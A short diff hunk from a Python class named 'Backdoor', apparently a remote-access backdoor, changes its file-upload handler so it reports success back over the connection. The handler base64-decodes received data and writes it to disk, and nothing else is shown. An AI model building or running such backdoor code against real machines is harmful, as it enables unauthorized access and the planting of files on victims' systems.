@@ -52,7 +52,7 @@ class Backdoor:
 		content = base64.b64decode(content)
 		with open(path, "wb") as file:
 			file.write(content)
-			print(f"[+] You can see your file as {path}")
+			self.reliable_send(f"[+] File uploaded as {path}")
 
 
 	def read_file(self, path):
